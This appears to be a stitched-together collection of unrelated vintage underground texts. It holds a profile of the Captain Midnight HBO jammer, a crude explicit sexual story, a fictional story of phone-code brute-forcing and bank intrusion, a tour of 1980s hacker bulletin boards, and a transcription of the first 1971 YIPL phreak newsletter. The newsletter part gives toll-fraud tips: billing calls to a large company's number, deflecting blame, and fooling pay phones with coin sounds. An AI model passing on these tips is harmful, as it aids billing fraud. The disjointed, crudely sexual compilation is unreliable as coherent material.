taken my word for things because I've always seemed to be a little younger than they are, and maybe a little less experienced, but I've always come up with the right answer.  They didn't seem to believe my theory.  Well, I guess they ought to believe it now, because I was right.                           THE TIP OFF    It was a phone call made by a disgruntled dish owner from Ocala that concentrated the FCC's investigation on the Central Florida Teleport.  Someone claiming to be Captain Midnight was overheard by a tourist from Wisconsin at a phone booth just off Interstate 75 in Gainesville, Florida.  The tourist reported the conversation and the man's license plate number to the FCC. MacDougall says the impostor was a customer of his, but he doesn't know his last name.  Again, he was outraged.   He was very militant about scrambling and the cable progra business, and not tried to make out like some kind of hero, I would still be panicking and wondering whether they were going to come and get me.     MacDougall's voice rises as he exclaims,  I still can't believe this guy actually told people he was Captain Midnight and MacDougall says the only time he broke the law was driving over the 55 mph speed limit.   I never even bought beer under age.  I was a model citizen,  he says earnestly.                       FCC MOVES IN    In July, FCC investigators talked to MacDougall, asking questions that led him to believe they knew what had happened.  He told them he hadn't done it, and that he had no knowledge of the incident, but then he really began to worry.   I was very concerned about it, but I didn't let on,  he says.   I'm able to hide my feelings very well.  I can just about convince people I'm a total raving maniac at the same time.     Two weeks later, the FCC returned.  This time, they brought along U.S. Attorney Lawrence Gentile III, who served MacDougall with a subpoena to appear in U.S.  District Court in Jacksonville.  According to MacDougall, their conversation went like this      What's this for   MacDougall asked when Gentile held out the subpoena.     Captain Midnight,  answered Gentile.   Aren't you aware that you're a suspect in this incident       You're trying to tell me that just because I'm a satellite dish dealer and I happened to work for a teleport, I'm a suspect   responded MacDougall.     There are other things,  replied Gentile.     Well, what are they   asked MacDougall.     We can't discuss it here,  said Gentile.   We can talk about it in front of the grand jury.  You need to think very carefully about this.  You seem like a level headed man, but you don't seem to be taking this seriously.  This is a serious time.  You might want to consult with an attorney.      Attorney for what   questioned MacDougall.   I haven't done anything.  An innocent man does not need an attorney.  The only people who hire attorneys are guilty people.     According to MacDougall, Gentile then attempted to reach an agreement with him.   If you would be willing to talk to us about this and tell us what you know about this incident right now,  said Gentile,  I'd be willing to recommend probation to the judge and a small fine.  Probation and a fine are not bad considering what you're facing.  Let's face it, Mr.  MacDougall, this is not the crime of the century.  However, we have been getting a lot of pressure on this.     MacDougall said at that point he began to think there was not enough evidence to convict him  otherwise he wouldn't have been offered a plea bargain.  Still claiming innocence, MacDougall told Gentile he would see him in Jacksonville.    MacDougall's first brief jamming raid on HBO led investigators to strongly suspect him.  The investigation had been narrowed down to uplink stations with the capacity to pull off both raids, and then to those manned by the same person at the time of each incident.   We had a very good idea he was our man,  says Gentile.   Of all the people I talked with, he was the only one I gave target warnings to  the equivalent of the Miranda warnings police give when they make an arrest .   He says he leaned on MacDougall  pretty hard.     MEET CAPTAIN MIDNIGHT    Taking Gentile's advice, MacDougall contacted an Ocala attorney, John Green Jr.  When they first met, MacDougall recalls,  he said, 'Well, John, tell me about Captain Midnight.' And I reached out my hand and said, 'Well, here, that's me.'     Green advised him that he had a 70 percent chance of winning the case.  If convicted, he faced a  100,000 fine and or one year in jail.  But MacDougall decided to enter a plea of guilty.   There were two reasons,  he said.   I could release my guilt, plead guilty, and get it over with, do the right thing. That kept panging at me   do the right thing.  But the other side, the activist, kept saying, 'Stand up for your rights.' My idealism and my activism were combating my conservative upbringing and my conservative political leanings.  They were battling back and forth, and I was at my wits' end.  I didn't know what to do.     MacDougall also worried about going before the grand jury and trying to lie his way out of the charge.   I would not have wanted to take a midemeanor and make it a felony by committing perjury,  he says.  In the end, the determining factor was money.  Green advised his client that going to trial could take 6 to 12 months and cost  30,000 to  40,000.   During that time,  MacDougall says,  I couldn't have said anything, and I would have been bombarded by the press.  It would have been a nightmare.     Fighting and then losing the case was always a possibility, and MacDougall conjured up nightmares of what that might entail.   This was a federal penitentiary they could have sent me to,  he said.   The concept just didn't register, to be sitting eating lunch with the other convicts in striped uniforms, and a guy says, 'Hey, what are you in for   And I say, 'Oh, I operated a trnsmitter without a license.' I couldn't take the risk.                         FUN EDUCATION    By the time he went to the federal court on July 22 and went through the arrest procedure, which included being photographed and fingerprinted, MacDougall's curiosity was back in full force.   If I hadn't been directly involved, it probably would have been a fun educational experience,  he says.  You can't just plead guilty to a crime.  It's hours and hours of discussion, and you have to prove to the prosecutor, and also the judge, that you are guilty.  Then, you have to prove you weren't coerced into making the statement, and that you have knowledge of your rights.  MacDougall says officials at both the July 22 hearing and the sentencing, on August 26, were surprisingly cordial.  He speaks of smiles, handshakes from marshals, and understanding from U.S.  Magistrate Howard T.  Snyder, who fined him  5,000 and placed him on one year's probation.   I'm glad to see that the legal system does work,  he says.    Meanwhile, although convicted in court, MacDougall had become a hero to many dish owners and satellite TV dealers.  A group calling itself the Captain Midnight Grassroots Coalition had formed and was selling bumper stickers, T shirts, visors, and sweat bands to raise money for MacDougall's legal costs. Said Donald Cochran, spokesman for the coalition    While there are those who consider Captain Midnight a criminal for his unauthorized transmissions, there is another group made up of home satellite dish owners, small business people, and rebels, who support his actions as a non violent and non destructive protest in the best American tradition.                        THE RIGHT REASONS    MacDougall says he has had no direct involvement with the coalition, but he adds,  I would like to see my own industry support me in this.  Even though I may have done more harm than good, as some people think, I did it for the right reasons.     Central Florida Teleport owner Eagan, on the other hand, says that local opinion in Ocala and surrounding Marion County has gotten  silly.  When the coalition presented MacDougall with its first donation, a check for  500, in September, a crowd gathered outside his office, and drivers of passing cars and pickup trucks honked their horns.  Says Eagan,  There's a group of people here who think that John MacDougall is a wonderful man and a great hero who has done wonderful things for them.  But to me, that has not been placed in the perspective of the world view or even the regional view.  Ninety nine and nine tenths  percent  of the people don't agree.     Eagan says the only positive thing to come out of the incident was that MacDougall was in the home dish business and so there was at least a reason for him to have done it.   If it had been some crackpot who did it just for the hell of it, or an employee being vindictive, then the corporate community would have been more upset.  This way they can say, 'We're not the target, HBO was.'     Still, the FCC is stepping up security.  It has moved to require that by the end of 1987 every radio and television transmitter must use an electronic name tag whenever it is on the air.  Each satellite uplink station would leave a unique, unchangeable electronic signature whenever it was used.  Also, a bill is being drafted in Congress that would raise the penalty for satellite interference to a  250,000 fine and or 10 years in jail.                      SCRAMBLING A REALITY    HBO's Levy says that now that scrambling is a reality, he believes consumers are dropping their emotional resistance to it.   We were the first ones to scramble,  he says.   We got the arrows in the back and we were the ones to get jammed.  We're over the first hurdle.  HBO wants its products in every home in America.  We are attempting to increase our business through home dish owners. We're calling for the marketplace to set the price.  It wouldn't make sense for HBO to stifle its growth.    MacDougall says he never contested the right of HBO and other programmers to make a profit from their programs, nor did he object to their right to protect those profits by scrambling signals.   My real concern is that the free and competitive marketplace be allowed to operate for the benefit of the American people,  he says.  Now, he believes that the last line of Captain Midnight's message  Showtime Movie Channel Beware!  was misunderstood and got him into a lot of trouble.   It was a bad choice of words on my part,  he says.   I was just trying to tell them    Look before you leap.  Don't follow HBO as the leader.'     It was, he says, the act of a frustrated individual who was trying to get his point across to people who didn't seem to listen.  He hopes no one will try to imitate what he did    The message is now out  there's no reason to do it again.     MacDougall was born in Elmhurst, Illinois, just outside Chicago.  His mother, Thelma is a homemaker, and his father, Robert, was a successful building contractor, who retired when MacDougall was 9.  The youngest of three brothers and one sister, MacDougall moved to Florida with his family shortly after his father's retirement at the age of 47.  MacDougall speaks often of his father. Although his entire family supported him after the HBO incident, he says,  My father is of the old school, a very staunch conservative   the law is the law, and it should never be broken.                        WAS IT WORTH IT     MacDougall says he doesn't know now if playing Captain Midnight was worth it all    I might be able to better answer that in a couple of months.  He intends to write a book about the incident and plans to continue holding on with his satellite TV business in Ocala.  He says that like many small businessmen, he didn't start off with enough money, although he did turn a profit in his first year.   I'm losing money now and a good businessman doesn't lose money,  he admits.   I didn't buy expensive food.  I bought cheap gas for my car.  I cut everything I could and I'm still losing.  Now, I can barely plan a month ahead because of the volatile changes in the business.  You never know what's going to happen the next day.     MacDougall believes in himself, although he says he's not a great salesman. He lost his job at the Central Florida Teleport before he was revealed as Captain Midnight, because People's Choice went off the air.  But all the publicity has resulted in more repair business from dish owners, and he says manufacturers return his calls quicker now.   There's a certain pride that goes into my systems,  he says.   I sell a part of myself with each system.     For all his public declarations of regret, there is also an undeniable pride in having pulled off the notorious HBO raid.

The short haired Greek man looked at me strangely from behind the counter. Several of the waitresses glared in my direction.     What you mean 'fuck around'   the dumpy Greek asked.     You know, like shovin' your dick in and out of the openings in the meat. Then, like, getting a bunch of smelly, sticky cream of tubesteak all over the junk that you grind into foodburgers,  I informed him.     Naw.  We don't do that.  You don't do that.  Nobody do that,  the imbecile claimed.     I do that,  I began,  and as a matter of fact, most of my pals do that too. We like it.     Overhearing our conversation, one of the waitresses gave me a sour look. She seemed to be acting like she was getting sick.  The cook and the other two waitresses completely ignored everything except the random orders for patty melts and double cheeseburgers.     Look, I don't wanna do nothin' weird or strange or anything.  I just wanna fuck a bunch of meat that you got in your huge ol' meat locker.  Listen, don't any of you stupid fuckers understand what I'm sayin'   I stated in an agitated manner.     Mister, people gotta eat my food.  If you stick dick in food, no can eat. Frank lose money.  No can do,  the Greek said.     How much money would you lose, bright eyes   I asked.     Big thing of cow cost Frank  220 for a half,  Greek man said.     Well, I wanna fuck around with about 13 of them.  Let's see...that's about  2860...and I'll give you...oh, let's see... 40 just for letting me do it, OK       I dunno.      OK.  Look, I'll give you  3000 cash, RIGHT NOW, cause I like you an awful lot, and also cause I'm fucking sick and tired or trying to talk to you goddamn Greek half wits.     The Greek seemed to ponder what I had said for a minute, or perhaps he was just wallowing in incomprehension.  One waitress went into the back room and loudly threw up.     OK.  But you give Frank money NOW.     I handed the three bills over to the fool and lifted up a section of the counter and walked into the walk in freezer.     OK, you can fuck with 13 sides of cow, but leave cheese and other gunk alone. OK      There was a wide variety of different kinds of food present in the walk in freezer.  Many, many eggs and other fine foods.  I could see containers of pancake batter and butter.  On the left was what I was after.  Thirteen beautiful sides of beef!    I started to get a hard on just looking at the beef!     You got your cash.  Get out of here!  I shouted at the geek.    I casually waltzed up to the nearest beef side and began to sweet talk it.

Images flicker as the breeze gently moves the Levelors about, the window ajar.  With a crackly and abrupt tone, an alarm pierces the stillness of the night. With the sounds of  True Colors , motions emerge from the stillness that had encompassed the bed. With a puff of energy, a set of Garfield sheets and a wool blanket jump to life, flying from their resting position on his body to the floor. In a few seconds the clump comes to a rest, beside a clump of dirty laundry and adjacent to a stagering stack of records, filled with the likes of The Wings, The Rolling Stones, and the Who.  And from beneath the edge of the sheets emerges a foot, followed by a tired leg, and eventually another leg. With the roar of thunder, a giant slithers forth from his resting position, propping himself up on an elbow. Click and a burst of artificial light washes across the room. The once faint images now become sharp. The likes of Madonna and Vanity pecker the wall, amidst the portraits of George the Ape, Tarzan, and Leatherface.  With a thud those feet slap onto the floor, stradling a well used weight bar. A powerful yawn erupts, and with it he stands, towering over the clothes and articles that scatter his residence. With precision movements, he slips into clothes, which he had layed out the previous evening, perched atop an old cedar chest.  Dressed in a tattered and torn pair of purple Bermuda shorts, a VistaVision ILM tee shirt, and black Converse All Star high tops  his parents call them obnoxious , he staggers across the room, in search of a door. Mission complete. He steps into the hallway. makes a hair pin right turn, and finds himself in the bathroom.  Click. With an abundance of energy, he fights off tartar for just a few minuets. How could tartar existed for so long and people haven't known about it  Is it going to kill me , he ponders. And on pop the rubberbands that make his braces hurt so much.  With all the precision of a member of a color guard, he passes down the hallway to the stairs, and slowly descends. At the bottom, he rounds a corner, and is met by a large cabinet, which he promptly opens, exposing a mass of machines. The low rumble of an IBM fan can be heard, and the rumble of a hard drive is sporatic.  Sitting atop the cabinet, a Hayes busily flickers its lights in a hypnotic manner, dialing and redialing. The ansi monitor is quiet. With the flick of a switch, it bursts to life, showing the images of an illegal program.  Jackpot , he mumbles, in reference to the screen, which tells him that the program is calling the local MCI number, trying various codes, and writing down the ones that work, a total of 17 for about 5 hours of work.  Grabbing his favorite swivel chair, he positions himself in front of the machine, his battle versus the monsters of the phone lines almost done. It is almost 3 in the afternoon, and his rewards have cost him dearly. A lack of sleep has plagued his schoolwork, but, for some unknown and unique reason, he cares not. A quick scan of the house tells him that he is alone. His parents are not to be found. And still the lights of the modem flicker.  He taps the  S  key, and a quick beep emerges from the depths of the machine. Would you like to see the codes  the program asks. With a grin he thanks the machine, says no, but tells it to print out the numbers. What a helpful computer, he thinks.  After a peek through some recent printouts, he circles a phone number. He takes out the disk in his drive, ponders what it could possibly be, tosses it aside, and calls up his terminal program. He takes a second to tell this program about his marvelous success with MCI, and, after he is finished, he enters the phone number that he had circled. He pauses for a second, sitting there statue like, thinking.  Like a cat pounching on a mouse, he begins to peck at the keyboard, with fire in his eyes and fear in his heart. He guides the program through the process of selecting a numner, telling it to dial the newset MCI code, and the newest number. Patiently he waits. The modem is quiet. All is calm. CONNECT, the machine says.  His face turns red. Welcome to the First Bank of Miami. Can I help you  Uh oh. Flashback. Is it the same  Oh no. It is. Can this be real  I guess it has to be. Ok. Lets see if there has been any evolution, he thinks to himself.  Enter bank account number please , it says. He pauses. And then he types those infamous numbers. 88693. There. It is done. But will it work  His heart races at an incredible speed. Why isn't it saying INVALID NUMBER, TRY AGAIN  he murmers.  He's in. Minor joy can be seen on his face. Some things never change. Password please, it says. And with that, he commits a felony. GEORGE, he tells it. And the room is filled with silence as his screen blanks and there is a pause.  The screen fills with blue letters. Across the top of the color screen it says First bank of Miami. The rest of the screen fills with a menu. A uthorize loans, C alculate interest, D isplay account total, and so on. There are the normal options. He is sitting in the chair of a bank employee. He is a bank employee. Or, at least thats what the computer at the other end thinks.  Again he pauses. It's still not too late to turn off the machine, he thinks to himself. Bullshit, he says out loud. His mind is set. There is no turning back.  He hits the T. Transfers. Ah, sweet memories, he says to himself. A little older, a little wiser, and a lot smarter, he says to the empty room.  With that, a new menu appears on the screen. The options are about ten, from such things as account profile to transfer. A quick check at the profile, and he discovers that there are still old ladies nursing their nest eggs, like they were 2 years earlier, the last time he was through this way.  But that does not last.  The screen goes blank. There is a pause. A cursor appears in the top left corner. It drops down a few lines. Oh shit, he gasps. What the fuck is going on  Questions rip through his mind at an eternal pace. What is this  What's going on   Who is this  says the cursor.  He dies. Right then and there he dies. It's all over. He has died and gone to hell for his sins.  Gareth Sullivan, he replies. Will they buy it  Will Gareth find out  Fuck Gareth, will they buy it   What are you doing here  it asks.  An idea pops into his mind. No light bulb appears above his head. Instead, a flood light does. He has a plan.  Is this Freddie  This is some board you got here, Freddie, he says with a snicker. You had me going there for a second, Fred 'ol pal. I thought this actually WAS a bank for a second, he snaps back. Deep in his mind he knows this is his only chance.  You have made a terrible mistake. This IS a bank. And what you are doing is called Wire Fraud, and possibly even Grand Theft, dances the little cursor. I suggest you hang up right now, and forget what you know, says the machine.  Freddie, if this is some kind of joke, I'm gonna be upset, he enters as fast as he can. But if it is real, well, I'm gonna get the fuck out of here. Bye.  And he hangs up. Beads of sweet drip down his forehead. he breathes fast. His heart pounds. He waits.  A minuet passes. He sits back in his chair and stares at the phone. He is relieved. It does not ring. He is relieved. He sits there and wonders what he would do if the phone DID ring, and it WAS them. I would die, say says, as a turns back to the computer, looks at the program, and smiles. Ah. The beauty of creativity, he says to himself. And all that BS.     Call the author.

You have walked several hundred feet when stumble into a bright blue portal... With a sudden burst of light and a loud explosion you are swept into... DRAGONFIRE... PRESS ANY KEY IF YOU DARE.       You have programmed your personal computer to dial into Dragonfire, a computer bulletin board in Gainesville, Texas.  But before you get any information, Dragonfire demands your name, home city and phone number.  So, for tonights tour of the electronic wilderness you become Montana Wildhack  a character in Kurt Vonnegut's book 'Slaughterhouse Five'  of San Francisco.       Dragonfire, Sherwood Forrest sic , Forbidden Zone, Blottoland, Plovernet, The Vault, Shadowland, PHBI and scores of other computer bulletin boards are hang outs of a new generation of vandals.  These precocious teen agers use their electronic skills with to play hide and seek with computer and security forces.  Many computer bulletin boards are perfectly legitimate   They resemble the electronic versions of the familiar cork boards in supermarkets and school corridors, listing services and providing information someone out there is bound to find useful.  But this is a walk on the wild side, a trip into the world of underground bulletin boards dedicated to encouraging    and making    mischief.       The numbers for these boards are as closely guarded as a psychiatrist's home telephone number.  Some numbers are posted on underground boards  others are exchanged over the telephone.  A friendly hacker provided Dragonfire's number.  Hook up and see a broad choice of topics offered.  For Phone Phreaks    who delight in stealing service from AT T and other phone networks    Phreakenstein's Lair is a potpourri of phone numbers, access codes and technical information.  For computer hackers    who dial into other people's computers    Ranger's Lodge is chock full of phone numbers and passwords for government, university and corporate computers.       Moving through Dragonfire's offerings, you can only marvel at how conversant these teen agers are with the technical esoterica of today's electronic age.  Obviously they have spent a great deal of time studying computers, though their grammar and spelling indicate they haven't been as diligent in other subjects.  You are constantly reminded of how young they are...       Well it's that time of year again.  School is back in session so let's get those high school computer phone numbers rolling in.  Time to get straight A's, have perfect attendance except when you've been up all night hacking school passwords , and messing up your worst teacher's paycheck.       Forbidden Zone, in Detroit, is offering ammunition for hacker civil war    tips on crashing the most popular bulletin board software.  There are also plans for building black, red and blue boxes to mimic operator tones and get free phone service.  And here are the details for 'the safest and best way to make and use nitroglycerin,' compliments of Doctor Hex, who says he got it 'from my chemistry teacher.'      Flip through the 'pages.'  You have to wonder if this information is accurate. Can this really be the phone number and password for Taco Bell's computer   Do these kids really have the dial up numbers for dozens of university computers   The temptation is too much.  You sign off and have your computer dial the number for the Yale computer.  Bingo    the words Yale University appear on your screen.  You hang up in sweat.  You are now a Hacker.      Punch in another number and your modem zips off the touch tones.  Here is the tedious side of all this.  Bulletin boards are popular.  No vacancy at Bates Motel  named for Anthony Perkin's creepy motel in the movie 'Psycho'   the line is busy.  So are 221 B. Baker Street, PHBI, Shadowland and The Vault. Ceaser's Palace rings and connects.  This is a different breed of board. Ceaser's Palace is a combination Phreak board and computer store in Miami. This is the place to learn ways to mess up a department store's antishoplifting system, or make free calls on telephone with locks the dial.  Pure capitalism accompanies such anarchy.  Ceaser's Palace is offering good deals on disk drives, software, computers and all sorts of hardware.  Orders are placed through electronic mail messages.      'Tele Trial'   Bored by Ceaser's Palace, you enter the number for Blottoland, the board operated by one of the nation's most notorious computer phreaks    King Blotto.  This one has been busy all night, but it is now pretty late in Cleveland.  The phone rings and you connect.  To get past the blank screen, type the seconday password 'S L I M E.'  King Blotto obliges, listing his rules   He must have your real name, phone number, address, occupation and intrests.  He will call and disclose the primary password, 'if you belong on this board.'  If admitted, do not reveal the phone number or secondary password, lest you face 'tele trial,' the King warns as he dismisses you by hanging up.       You expected heavy security, but this teen ager's security is, as they say, awesome.  Computers at the Defense Department and hundreds of businesses let you know when you reached them.  Here you need a password just to find out what system answered the phone.  Then King Blotto asks questions    and hangs up.  Professional computer security experts could learn something from this kid.  He knows that ever since the 414 computer hackers were arrested in August 1982, law enforcement officers have searching for leads on computer bulletin boards.       'Do you have any ties or connections with any law enforcement agency or any any agency which would inform such a law enforcement agency of this bulletin board '       Such is the welcoming message from Plovernet, a Florida board known for its great hack phreak files.  There amid a string of valid VISA and Mastercard numbers are dozens of computer phone numbers and passwords.  Here you also learn what Blotto means by tele trial.  'As some of you may or may not know, a session of conference court was held and the Wizard was found guilty of miscellaneous charges, and sentenced to four months without bulleting boards.' If Wizard calls, system operators like King Blotto disconnect him.       Paging through the bulletin boards is a test of your patience.  Each board has different commands.  Few are easy to follow, leaving you to hunt and peck your way around.  So far you haven't has the nerve to hit 'C,' which summons the system operator for a live, computer to computer conversation.       The time, however, has come for you to ask a few questions of the 'sysop.' You dial a computer in Boston.  It answers and you begin working your way through the menus.  You scan a handful of dial up numbers including one for Arpanet, the Defense Department's research computer.  Bravely tap C and in seconds the screen blanks and your cursor dances across the screen.       Hello... What kind of computer do you have        Contact.  The sysop is here.  You exchange amenities and get 'talking.' How much hacking does he do   Not much, too busy.  Is he afraid of being busted, having his computer confiscated like the Los Angeles man facing criminal charges because his computer bulletin board system contained a stolen telephone credit card number   'Hmmmmm... No,' he replies.  Finally he asks the dreaded question   'How old are you '  'How old are YOU,' you reply, stalling. '15,' he types.  Once you confess and he knows you're old enough to be his father, the conversation gets very serious.  You fear each new question  he probably thinks you're a cop.  But all he wants to know is your choice for president.  The chat continues, until he asks, 'What time is it there '  Just past midnight, you reply.  Expletive.  'It's 3 08 here,' Sysop types.  'I must be going to sleep.  I've got school tomorrow.'  The cursor dances. '            Thank You for Calling.'  The screen goes blank.    "

I have tried to reproduce it as accurately with possible since there are a few diagrams.  As for the format it was a four page booklet  the same format that is still used 13 years later     It was typewritten except for the larger print which was handwritten.  Today, TAP looks a little more professional than it did in its former days.  Also, TAP has become extremely  conservative  compared to the days of its youth when the newsletter was run by anti war anti government anti everything yippies.  Now, onto issue  1.                BIOC Agent 003               Associate Editor                                                                                 Published            June, 1971 Monthly          THE YOUTH INTERNATIONAL PARTY LINE'S FIRST ISSUE            We at YIPL would      like to offer        thanks to     all you phreeks         out there.  Most of you who are now   receiving this met us in Washington on Mayday,         where we distributed 10,000 promo flyers.  So far         we have received over 50 responses, complete with         contributions, encouragement, and spirit.  We may         not have done well percentage wise, but the fact      that there are 50 people all over the country willing      to fight back speaks for itself.  We are sure that from      the spirit of response, YIPL membership will really      skyrocket. However, more important than our numbers,      in our opinion, is the feeling and motivation for this      movement.  The disappointment we feel toward Amerika has      turned to hatred as we saw the futility of the movement      to improve it, and to frustation as our outside efforts      were repressed and forbidden.  But we did NOT turn our      backs on the movement for change.  YIPL believes that      education alone cannot affect the System, but deucation      can be an ivaluable tool for those willing to use it.      Specifically, YIPL will show you why something must be      done immediately in regard, of course, to the improper      control of the communication in this country by none      other than the BELL TELEPHONE COMPANY.       So if your friends want to get in on the fun, let them     read your newsletter, and you might want to research your    own questions in your local library, and help to start the   education of your community of the phone company's part in the  war against the poor, the non white, the non conformist, and in        general, against the people.  Show your neighbors, friends and the       representatives of your area how the Bell System and the Amerikan      government are co conspirators.  If your friendscan't subscribe to     YIPL, that  is cool, is convenient for our small staff, and is right on    if they can send a buck as a donation and read your newsletter.  We also   need stamps, letters, and envelopes, which maybe they can get from their   office at work.  Because we are already sending out issues to people short  on bread, we really do need this kind of help.  We will report on all of our  finances from time to time, and if you can dig it, we will probably need some  kind of bail fund set up.  If any YIPL busts happen, we'd like to ask you all   in advance to work extra hard for the cause. People, thanks again.  Love          THE CREDIT CARD CODE The 1971 Credit Card system works as follows  The telephone number  7 digits  of the number to be billed is followed by the secret number for the area code of the number.  They are listed below for several cities. At the end of the number comes a letter that matches the sixth digit of the telephone number.  Many people look up the number of a large Company in the area and use their number, cause using any old number might lead to THAT person refusing to pay, and the Phone Company's hasseling the person to whom the call was placed.  They should say that others use that phone, and they don't know anything. Fraud is illegal, so WE don't think you should make free calls. This Code has already been printed in many underground papers, as you know.

TECHNICAL INFOMRMATION  As long as you're paying a bill, the phone company will tend to let you be. We all know that you might have extra phones you want connected as freebees. Not Western Electric phones, of course.  Remember, the phone company  frowns upon  hooking them up yourself, so wwe suggest you have a friend do it.  On hook voltage 45V Off hook voltage 4.5V  Your telephone line is usually a red and a green Ring pulses  90V  wire. A yellow is sometimes used for ringing.  Un      screw your storebought phone on the bottom and you will find a box with a bunch of screws on it.  Connecting as in the phone will keep it a secret from  Them .                                                     !

Ever wonder how those conference call makers that are sold on the commercial market work   What they do is as follows         DOUBLE POLE, DOUBLE THROW,                   TO PHONE    CENTER OFF, SWITCH      !                    !        !         !        !       !

ZZZZZZ  1000 OHM,1 WATT               RESISTOR Flickering a switch up puts the phone on that number.  Flicking it down puts that number on  hold .  The center position turns the first number off.  The resistor keeps the line  off the hook  electrically, so if it is on hold, you will not be able to receive phone calls on that number.  You line would would appear  busy  to callers.  Simple enough   Yippies have been know to fool around with shit like this from time to time without the permission of their local telephone company and even though they usually get away with it, we at YIPL would never think of advocating that thype of irresponsible activity.  You should always check with your local phone company to pay them any extra money that you might be responsible to them for, before ever fooling around with your phone. The phone company is our friend, and they are here to help you.

Your brother in the movement  H.M., Jamestown, N.D.  My dearest sirs  Nothing pleasure me more than ripping off Mother Bell. Please send newsletter. Encloses is  1 U.S.  Also a question...A few friends of mine make long distance calls free from pay phone booths by holding the mouthpiece of the phone they're using up to the phone next to it so the operator hears the change jingle and makes the connection.  I've tried it here in D.C. and the operator says the cash hasn't registered  which of course it hasn't .  Please tell why.  Thanks a lot.  B.S., DuBois, Pa.       In our nation's Kapital there are the shiny new pay phones that work electronically, instead of the ding  5c , ding ding  10c  or dong  25c .New ones have only one slot for depoit, and oon old ones your trick works, but hold the handset CLOSE to that phone!      Editor  Send me the shit and don't rip me off  please   S.M., Winchester, Pa.  Dear Y.I.P.L., I thought you might be interested in a movement started here in Lancaster.  The movement is to have people who wish to see our troops out of Vietname this year call their local phone company manager and have their phone removed.  The manager must be told why if it is to have any effect.Hopefully enough people will feel strongly   give up phone service to begin showing up on the profits of the phone company.  This would push the phone lobbies to speak out  Bell especially  to end our continued involvement there.  If you can assist in any way by encouraging this to take place in other areas it would be appreciated. Thanks!  J.G., Lancaster, Pa.  Hi People, Here's my bill, send me shit on fucking the Bell System.  Man do I need info on this kinda shit thanks D.B., State College, Pa.                                                                                  OUR FRIENDLY PHONE COMPANY...  Our example of eavesdropptin that touches a vast number of Americans was related to the Subcommittee by Joseph Beirne, President of the Communications Worker of America.  He revealed that the phone company does not limit its invasions of privacy to assisting the FBI an other government tappers. He pointed out that   as part of its training program, and as part of its cont  inuing close supervision of its employees, the telephone industry has developed equiptment for monitoring its operators, its service assistants, its commercial office employees in short, all of its employees who deal with the customer. Such monitoring means, of course, that the customer is, in effect, monitored at the same same time.   An alert snooper is sometimes able to obtain the information he needs simply by calling the telephone office and posing as a telephone repairman.  Or, if the tapper is a law enforcement officer, here may be able to secure the outright cooperation of the telephone company in the placing of his taps.  In Kansas City, the existence of just such an arrangement between the telephone company and the chief of police was reveled.  The above two quotes were made by Senator Edward V. Long.  In the office we call it  The System , and use of the word  the  means dog  matic finality.  The wall comes up pretty fast when you start tampering with the way things are done within The System, and you either slow down and do things Bell's way or knock your brains out. AT T junior executive,spring,1967                                                                                   In April of 1966, as the government was excalating the Vietnam war, Congress passed a law raising the Federal tax on telephone service to 10 .   It is clear,  said Rep. Wilbur Mills, Chairman of the House Ways and Means Committee,  that Vietnam and only the Vietnam operation makes the bill necessary .  Congressional Record,February 23,1966.  The War Tax Resistance is showing people how to refuse to pay this war tax.  In most cases, the IRS will come to collect with 6  interest but your phone service will continue. But the more it's done, the more it costs Them in time, trouble and embarrasment for Uncle Sham.  Do it, and tell your friends, relatives and neighbors to do the same.  Include a letter to this effect to the phone company and your congressmen               Date_____________________  BECAUSE OF THE BRUTAL AND AGGRESSIVE WAR the United States government is conducting against Vietnam, the amount of federal excise tax,  ............., has been decucted from my payment of this bill.  I have opposed this war and protested against it in many ways.  Now I must testify to my opposition by refusing to pay this tax.     The telephone excise tax was raised in April, 1966, only in order to help pay for the war in Vietnam.  Paying the tax means helping to pay for outright atrocities, for the murder of innocent women and chidren.  It means helping to pay for the indicscriminate bombin and napalming of defenseless villages.  It means helping to finance the shipping of American boys half way around the world to die defending an unpopular, totalitarian and corrupt regime.     I am sorry for any incovenience my tax refusal may cause your office and hope you will understancd that this protest is not directed against the telephone company.  I hope also that you will soon join me and the many others others who have decided that it is now necessary to oppose the war by refusing to pay the telephone exciese tax that helps finance it.
